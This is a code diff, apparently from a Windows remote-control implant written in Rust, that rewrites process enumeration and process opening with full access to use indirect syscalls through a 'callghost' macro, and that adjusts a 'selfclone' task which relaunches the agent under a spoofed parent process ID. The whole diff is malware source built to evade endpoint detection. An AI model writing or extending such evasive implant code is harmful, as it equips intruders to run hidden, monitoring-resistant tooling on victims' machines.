@@ -1,11 +1,11 @@
-use crate::hellshall::{NtSyscall, RunSyscall, SetSSn, fetch_nt_syscall, crc32h};
 use crate::transport;
+use callghost::syscall;
 
 use std::mem;
 use std::ptr;
 use std::slice;
 
-use winapi::shared::ntdef::{NTSTATUS, PVOID, ULONG, UNICODE_STRING, LARGE_INTEGER, HANDLE};
+use winapi::shared::ntdef::{PVOID, ULONG, UNICODE_STRING, LARGE_INTEGER, HANDLE};
 use winapi::shared::minwindef::{FALSE, LPVOID};
 use winapi::um::handleapi::CloseHandle;
 use winapi::um::libloaderapi::GetModuleFileNameW;
@@ -85,25 +85,16 @@ struct STARTUPINFOEXW {
 
 /// Find the PID of a process by name using NtQuerySystemInformation via indirect syscall.
 unsafe fn find_process_pid(target_name: &str) -> Option<u32> {
-    let hash = crc32h("NtQuerySystemInformation");
-    let mut syscall: NtSyscall = mem::zeroed();
-    if !fetch_nt_syscall(hash, &mut syscall) {
-        return None;
-    }
-
-    SetSSn(syscall.dw_ssn as u16, syscall.p_syscall_inst_address);
-
     let mut buffer = vec![0u8; BUFFER_SIZE];
     let mut return_len: ULONG = 0;
 
-    let status: NTSTATUS = RunSyscall(
-        SystemProcessInformation as _,
-        buffer.as_mut_ptr() as _,
-        BUFFER_SIZE as _,
-        &mut return_len as *mut _ as _,
-        ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
-        ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
-        ptr::null_mut(),
+    let status = syscall!(
+        indirect,
+        NtQuerySystemInformation,
+        SystemProcessInformation,
+        buffer.as_mut_ptr(),
+        BUFFER_SIZE as u32,
+        &mut return_len
     );
 
     if status != 0 {
@@ -139,12 +130,6 @@ unsafe fn find_process_pid(target_name: &str) -> Option<u32> {
 
 /// Open a process handle via NtOpenProcess indirect syscall.
 unsafe fn open_process(pid: u32) -> Option<HANDLE> {
-    let hash = crc32h("NtOpenProcess");
-    let mut syscall: NtSyscall = mem::zeroed();
-    if !fetch_nt_syscall(hash, &mut syscall) {
-        return None;
-    }
-
     #[repr(C)]
     struct OBJECT_ATTRIBUTES {
         Length: ULONG,
@@ -169,16 +154,13 @@ unsafe fn open_process(pid: u32) -> Option<HANDLE> {
     let mut cid: CLIENT_ID = mem::zeroed();
     cid.UniqueProcess = pid as usize as HANDLE;
 
-    SetSSn(syscall.dw_ssn as u16, syscall.p_syscall_inst_address);
-
-    let status: NTSTATUS = RunSyscall(
-        &mut handle as *mut _ as _,          // ProcessHandle
-        PROCESS_ALL_ACCESS as usize as _,    // DesiredAccess
-        &mut oa as *mut _ as _,              // ObjectAttributes
-        &mut cid as *mut _ as _,             // ClientId
-        ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
-        ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
-        ptr::null_mut(),
+    let status = syscall!(
+        indirect,
+        NtOpenProcess,
+        &mut handle,
+        PROCESS_ALL_ACCESS,
+        &mut oa as *mut _ as *mut u8,
+        &mut cid as *mut _ as *mut u8
     );
 
     if status == 0 && !handle.is_null() {
@@ -312,7 +294,7 @@ pub fn selfclone(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Err
                     Some(parent_handle) => {
                         // Step 3: Create the clone with spoofed PPID
                         let result = clone_with_ppid_spoof(parent_handle);
-                        CloseHandle(parent_handle);
+                        crate::nt_mem::close_handle(parent_handle as *mut _);
 
                         match result {
                             Ok(new_pid) => {
